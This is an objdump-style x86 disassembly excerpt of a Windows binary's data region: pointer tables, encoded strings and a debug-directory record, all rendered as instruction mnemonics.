  43363a:	add    BYTE PTR [edi],cl
  43363c:	ss inc ebx
  43363e:	add    BYTE PTR [ebx],dl
  433640:	ss inc ebx
  433642:	add    BYTE PTR [edi],dl
  433644:	ss inc ebx
  433646:	add    BYTE PTR [ebx],bl
  433648:	ss inc ebx
  43364a:	add    BYTE PTR [edi],bl
  43364c:	ss inc ebx
  43364e:	add    BYTE PTR [ebx],ah
  433650:	ss inc ebx
  433652:	add    BYTE PTR [eax+0x9001011],ah
  433658:	jo     0x43366a
  43365a:	add    BYTE PTR ds:0xd7001027,ch
  433660:	pop    eax
  433661:	adc    BYTE PTR [eax],al
  433663:	push   es
  433664:	adc    al,0x10
  433666:	add    BYTE PTR [esi+0x33001031],ah
  43366c:	ins    BYTE PTR es:[edi],dx
  43366d:	adc    BYTE PTR [eax],al
  43366f:	jb     0x4336b0
  433671:	adc    BYTE PTR [eax],al
  433673:	push   ebx
  433674:	ss inc ebx
  433676:	add    BYTE PTR [edi+0x36],dl
  433679:	inc    ebx
  43367a:	add    BYTE PTR [ebx+0x36],bl
  43367d:	inc    ebx
  43367e:	add    BYTE PTR [edi+0x36],bl
  433681:	inc    ebx
  433682:	add    BYTE PTR [ebx+0x36],ah
  433685:	inc    ebx
  433686:	add    BYTE PTR [edi+0x36],ah
  433689:	inc    ebx
  43368a:	add    BYTE PTR [ebx+0x36],ch
  43368d:	inc    ebx
  43368e:	add    BYTE PTR [edi+0x36],ch
  433691:	inc    ebx
  433692:	add    dh,cl
  433694:	jge    0x4336a6
  433696:	add    BYTE PTR [esi-0x3dffef8e],dl
  43369c:	or     dl,BYTE PTR [eax]
  43369e:	add    dh,bl
  4336a0:	sub    dl,BYTE PTR [eax]
  4336a2:	add    BYTE PTR [edx],bl
  4336a4:	ins    BYTE PTR es:[edi],dx
  4336a5:	adc    BYTE PTR [eax],al
  4336a7:	addr16 jno 0x4336ba
  4336aa:	add    BYTE PTR [ebp+0x3d],ch
  4336ad:	adc    BYTE PTR [eax],al
  4336af:	lds    esp,FWORD PTR [eax+0x10]
  4336b2:	add    BYTE PTR [ebx-0x68ffbcca],dl
  4336b8:	ss inc ebx
  4336ba:	add    BYTE PTR [ebx-0x60ffbcca],bl
  4336c0:	ss inc ebx
  4336c2:	add    BYTE PTR [ebx-0x58ffbcca],ah
  4336c8:	ss inc ebx
  4336ca:	add    BYTE PTR [ebx-0x50ffbcca],ch
  4336d0:	ss inc ebx
  4336d2:	add    BYTE PTR [esp+edx*1],bh
  4336d5:	adc    BYTE PTR [eax],al
  4336d7:	clc    
  4336d8:	cmp    dl,BYTE PTR [eax]
  4336da:	add    BYTE PTR [ecx],ah
  4336dc:	pop    ds
  4336dd:	adc    BYTE PTR [eax],al
  4336df:	mov    edi,0x6001073
  4336e4:	adc    al,0x10
  4336e6:	add    BYTE PTR [ecx+0x34],bh
  4336e9:	adc    BYTE PTR [eax],al
  4336eb:	cmp    edi,DWORD PTR [eax+edx*1+0x0]
  4336ef:	shl    DWORD PTR [edx+0x10],1
  4336f2:	add    bl,dl
  4336f4:	ss inc ebx
  4336f6:	add    bh,dl
  4336f8:	ss inc ebx
  4336fa:	add    bl,bl
  4336fc:	ss inc ebx
  4336fe:	add    bh,bl
  433700:	ss inc ebx
  433702:	add    bl,ah
  433704:	ss inc ebx
  433706:	add    bh,ah
  433708:	ss inc ebx
  43370a:	add    bl,ch
  43370c:	ss inc ebx
  43370e:	add    bh,ch
  433710:	ss inc ebx
  433712:	add    BYTE PTR [ebp+0x14],al
  433715:	adc    BYTE PTR [eax],al
  433717:	fwait
  433718:	pop    ds
  433719:	adc    BYTE PTR [eax],al
  43371b:	jnp    0x433740
  43371d:	adc    BYTE PTR [eax],al
  43371f:	pop    esi
  433720:	adc    BYTE PTR cs:[eax],al
  433723:	popf   
  433724:	jno    0x433736
  433726:	add    ah,bl
  433728:	inc    ebp
  433729:	adc    BYTE PTR [eax],al
  43372b:	sbb    edx,DWORD PTR [edx+0x10]
  43372e:	add    BYTE PTR [edx+0x13001029],bl
  433734:	aaa    
  433735:	inc    ebx
  433736:	add    BYTE PTR [edi],dl
  433738:	aaa    
  433739:	inc    ebx
  43373a:	add    BYTE PTR [ebx],bl
  43373c:	aaa    
  43373d:	inc    ebx
  43373e:	add    BYTE PTR [edi],bl
  433740:	aaa    
  433741:	inc    ebx
  433742:	add    BYTE PTR [ebx],ah
  433744:	aaa    
  433745:	inc    ebx
  433746:	add    BYTE PTR [edi],ah
  433748:	aaa    
  433749:	inc    ebx
  43374a:	add    BYTE PTR [ebx],ch
  43374c:	aaa    
  43374d:	inc    ebx
  43374e:	add    BYTE PTR [edi],ch
  433750:	aaa    
  433751:	inc    ebx
  433752:	add    BYTE PTR [esp+esi*1+0x4b],dl
  433756:	aaa    
  433757:	pop    edi
  433758:	inc    edx
  433759:	dec    ebx
  43375a:	xor    DWORD PTR [ecx],edi
  43375c:	push   edi
  43375d:	add    BYTE PTR [ecx+0x39],cl
  433760:	xor    al,0x5f
  433762:	pop    ecx
  433763:	inc    edi
  433764:	push   edx
  433765:	pop    edi
  433766:	dec    edx
  433767:	xor    al,BYTE PTR [edx+0x30]
  43376a:	push   ebx
  43376b:	add    BYTE PTR [ecx+0x4a],cl
  43376e:	cmp    BYTE PTR [edi+0x38],bl
  433771:	xor    al,0x43
  433773:	xor    bl,BYTE PTR [eax+0x36]
  433776:	pop    edi
  433777:	inc    ebx
  433778:	add    BYTE PTR [edx+0x33],cl
  43377b:	dec    ebp
  43377c:	cmp    BYTE PTR [edi+0x53],bl
  43377f:	xor    DWORD PTR [eax],edi
  433781:	pop    edx
  433782:	pop    edi
  433783:	xor    BYTE PTR [edx+0x52],cl
  433786:	inc    ecx
  433787:	add    BYTE PTR [edx+0x42],al
  43378a:	inc    ebp
  43378b:	pop    edi
  43378c:	cmp    DWORD PTR [eax],edi
  43378e:	push   ebp
  43378f:	inc    edx
  433790:	xor    eax,0x5244505f
  433795:	xor    BYTE PTR [eax],al
  433797:	inc    edx
  433798:	inc    esp
  433799:	inc    edx
  43379a:	cmp    DWORD PTR [edi+0x52],ebx
  43379d:	dec    esp
  43379e:	inc    ebp
  43379f:	add    BYTE PTR [ebx+0x37],dl
  4337a2:	push   esp
  4337a3:	xor    BYTE PTR [edi+0x55],bl
  4337a6:	push   ebx
  4337a7:	aaa    
  4337a8:	dec    ebp
  4337a9:	pop    edi
  4337aa:	xor    ecx,DWORD PTR [edx+0x4e]
  4337ad:	dec    ebx
  4337ae:	add    BYTE PTR [edx+0x47],cl
  4337b1:	inc    edi
  4337b2:	xor    eax,0x534e5f32
  4337b7:	push   esp
  4337b8:	pop    edi
  4337b9:	push   esp
  4337ba:	inc    edx
  4337bb:	add    BYTE PTR [ebx+0x4d],al
  4337be:	xor    BYTE PTR [edi+0x47],bl
  4337c1:	cmp    DWORD PTR [ecx+0x5f],ebx
  4337c4:	push   eax
  4337c5:	push   ecx
  4337c6:	push   ecx
  4337c7:	pop    edi
  4337c8:	inc    ebx
  4337c9:	push   edi
  4337ca:	push   esi
  4337cb:	add    BYTE PTR [ecx+0x57],cl
  4337ce:	inc    ebp
  4337cf:	pop    edi
  4337d0:	pop    ecx
  4337d1:	push   edx
  4337d2:	inc    edx
  4337d3:	pop    edi
  4337d4:	inc    edi
  4337d5:	add    BYTE PTR [ebx+0x51],dl
  4337d8:	cmp    DWORD PTR ds:0x4d305f33,esi
  4337de:	inc    edi
  4337df:	xor    edx,DWORD PTR [edx+0x34]
  4337e2:	pop    edi
  4337e3:	pop    edx
  4337e4:	cmp    BYTE PTR [eax],al
  4337e6:	inc    edi
  4337e7:	xor    esi,DWORD PTR ds:0x5451585f
  4337ed:	dec    esp
  4337ee:	add    BYTE PTR [edi+esi*1+0x34],cl
  4337f2:	pop    edi
  4337f3:	cmp    BYTE PTR [edi+0x49],dl
  4337f6:	xor    eax,0x5700505f
  4337fb:	cmp    DWORD PTR [edi+ebx*2+0x50],eax
  4337ff:	dec    esi
  433800:	dec    edx
  433801:	cmp    BYTE PTR [eax],al
  433803:	pop    edx
  433804:	dec    ebx
  433805:	xor    eax,0x4f5f3131
  43380a:	xor    dh,BYTE PTR [ecx]
  43380c:	pop    edi
  43380d:	inc    ebp
  43380e:	push   esp
  43380f:	inc    esp
  433810:	inc    ebp
  433811:	add    BYTE PTR [edi+0x55],dl
  433814:	cmp    DWORD PTR [edi+0x5a],ebx
  433817:	push   edx
  433818:	inc    edi
  433819:	xor    DWORD PTR [ebp+0x0],ecx
  43381c:	pop    edx
  43381d:	dec    ecx
  43381e:	dec    ebp
  43381f:	ss pop edi
  433821:	pop    edx
  433822:	push   edx
  433823:	cmp    BYTE PTR [esi+0x30],dl
  433826:	pop    edi
  433827:	push   ecx
  433828:	dec    esi
  433829:	add    BYTE PTR [ebx+0x32],dl
  43382c:	inc    ebx
  43382d:	cmp    BYTE PTR [edi+0x52],bl
  433830:	dec    ecx
  433831:	xor    BYTE PTR [eax],al
  433833:	inc    edi
  433834:	xor    eax,0x314f5f4b
  433839:	xor    DWORD PTR [edi+0x38],ebx
  43383c:	push   ebp
  43383d:	add    BYTE PTR [edi+0x4b],al
  433840:	xor    bl,BYTE PTR [edi+0x43]
  433843:	push   ebp
  433844:	cmp    DWORD PTR [ebp+0x4b],ecx
  433847:	ss pop edi
  433849:	pop    edx
  43384a:	push   edi
  43384b:	inc    esp
  43384c:	xor    BYTE PTR [eax],al
  43384e:	dec    ecx
  43384f:	inc    edi
  433850:	xor    eax,0x3058555f
  433855:	dec    ebx
  433856:	pop    edi
  433857:	push   edi
  433858:	add    BYTE PTR [eax+0x0],bl
  43385b:	inc    edi
  43385c:	add    BYTE PTR [edx+0x0],al
  43385f:	pop    edi
  433860:	add    BYTE PTR [ebx],dh
  433862:	add    BYTE PTR [eax],bh
  433864:	add    BYTE PTR [ebx+0x0],cl
  433867:	xor    eax,0x33003500
  43386c:	add    BYTE PTR [eax],dh
  43386e:	add    BYTE PTR [edi+0x0],bl
  433871:	push   esp
  433872:	add    BYTE PTR [ebp+0x0],cl
  433875:	xor    BYTE PTR [eax],al
  433877:	add    BYTE PTR [eax],al
  433879:	inc    esi
  43387a:	add    BYTE PTR [eax+0x0],bl
  43387d:	xor    BYTE PTR [eax],al
  43387f:	pop    edi
  433880:	add    BYTE PTR [ecx],dh
  433882:	add    BYTE PTR [ebx+0x0],al
  433885:	xor    eax,0x5f003100
  43388a:	add    BYTE PTR [ecx+0x0],al
  43388d:	xor    eax,DWORD PTR [eax]
  43388f:	add    BYTE PTR [eax],al
  433891:	push   ebx
  433892:	add    BYTE PTR [ebx+0x0],dl
  433895:	dec    eax
  433896:	add    BYTE PTR [edi+0x0],bl
  433899:	push   esp
  43389a:	add    BYTE PTR [ebx+0x0],al
  43389d:	push   ebx
  43389e:	add    BYTE PTR [edx+0x0],dl
  4338a1:	pop    edi
  4338a2:	add    BYTE PTR [ecx+0x0],dl
  4338a5:	dec    edi
  4338a6:	add    BYTE PTR [edi+0x0],al
  4338a9:	push   ecx
  4338aa:	add    BYTE PTR [edi+0x0],bl
  4338ad:	pop    ecx
  4338ae:	add    BYTE PTR [eax],al
  4338b0:	add    BYTE PTR [edi+0x0],cl
  4338b3:	dec    edi
  4338b4:	add    BYTE PTR [ebp+0x0],dl
  4338b7:	cmp    DWORD PTR [eax],eax
  4338b9:	pop    edi
  4338ba:	add    BYTE PTR [edx],dh
  4338bc:	add    BYTE PTR [eax+eax*1+0x32],al
  4338c0:	add    BYTE PTR ds:0x47005f00,dh
  4338c6:	add    BYTE PTR ds:0x48000000,dh
  4338cc:	add    BYTE PTR [edx+0x0],cl
  4338cf:	push   eax
  4338d0:	add    BYTE PTR [edi+0x0],bl
  4338d3:	cmp    BYTE PTR [eax],al
  4338d5:	add    BYTE PTR ss:0x55004100,dh
  4338dc:	add    BYTE PTR [edi+0x0],bl
  4338df:	push   edx
  4338e0:	add    BYTE PTR [edi],dh
  4338e2:	add    BYTE PTR [ecx+0x0],cl
  4338e5:	add    BYTE PTR [eax],al
  4338e7:	inc    esp
  4338e8:	add    BYTE PTR [ecx+0x0],dl
  4338eb:	inc    edx
  4338ec:	add    BYTE PTR [edi+0x0],bl
  4338ef:	push   ecx
  4338f0:	add    BYTE PTR [ecx+0x0],bl
  4338f3:	dec    edi
  4338f4:	add    BYTE PTR [eax+0x0],dl
  4338f7:	add    BYTE PTR [eax],al
  4338f9:	dec    edx
  4338fa:	add    BYTE PTR [ecx+0x0],dl
  4338fd:	inc    esp
  4338fe:	add    BYTE PTR [edi+0x0],bl
  433901:	dec    edx
  433902:	add    BYTE PTR [eax],dh
  433904:	add    BYTE PTR [ecx],dh
  433906:	add    BYTE PTR [ebx+0x0],dl
  433909:	push   ecx
  43390a:	add    BYTE PTR [ecx],dh
  43390c:	add    BYTE PTR [edi+0x0],bl
  43390f:	push   edi
  433910:	add    BYTE PTR [eax],al
  433912:	add    BYTE PTR [ebx+0x0],cl
  433915:	pop    edx
  433916:	add    BYTE PTR [esi],dh
  433918:	add    BYTE PTR [edi+0x0],bl
  43391b:	inc    ebx
  43391c:	add    BYTE PTR [eax+eax*1+0x5a],dl
  433920:	add    BYTE PTR [edi+0x0],bl
  433923:	push   edi
  433924:	add    BYTE PTR [ebx],dh
  433926:	add    BYTE PTR [esi+0x0],cl
  433929:	push   ebp
  43392a:	add    BYTE PTR [edi+0x0],bl
  43392d:	dec    edx
  43392e:	add    BYTE PTR [eax],al
  433930:	add    BYTE PTR [edi+0x0],dl
  433933:	aaa    
  433934:	add    BYTE PTR [eax],bh
  433936:	add    BYTE PTR [edi+0x0],bl
  433939:	pop    eax
  43393a:	add    BYTE PTR [edi+0x0],cl
  43393d:	inc    edi
  43393e:	add    BYTE PTR [edi+0x0],bl
  433941:	xor    al,0x0
  433943:	push   eax
  433944:	add    BYTE PTR [ecx+0x0],cl
  433947:	push   ebp
  433948:	add    BYTE PTR [eax],al
  43394a:	add    BYTE PTR [edi+0x0],dl
  43394d:	push   esp
  43394e:	add    BYTE PTR [ebx+0x0],cl
  433951:	add    BYTE PTR [eax],al
  433953:	add    BYTE PTR [edx+0x53],dl
  433956:	inc    esp
  433957:	push   ebx
  433958:	(bad)  
  433959:	outs   dx,DWORD PTR ds:[esi]
  43395a:	sbb    eax,0x65ff0c85
  43395f:	dec    esp
  433960:	mov    dh,0x31
  433962:	fnstcw WORD PTR [eax-0x6f]
  433965:	aaa    
  433966:	jp     0x433905
  433968:	sbb    eax,DWORD PTR [eax]
  43396a:	add    BYTE PTR [eax],al
  43396c:	push   esp
  43396d:	cmp    bl,BYTE PTR [ecx+edi*2+0x69]
  433971:	addr16 push edi
  433973:	bound  bx,DWORD PTR [edx+0x45]
  433977:	outs   dx,BYTE PTR ds:[esi]
  433978:	pop    esp
  433979:	je     0x4339ee
  43397b:	ja     0x4339be
  43397d:	imul   edx,DWORD PTR [ecx+esi*2+0x4d],0x63455c61
  433985:	js     0x4339f6
  433987:	jp     0x4339f8
  433989:	jns    0x4339ef
  43398b:	jp     0x4339f5
  43398d:	je     0x4339f3
  43398f:	jp     0x4339f3
  433991:	cs jo  0x4339f8
  433994:	bound  eax,QWORD PTR [eax]
	...
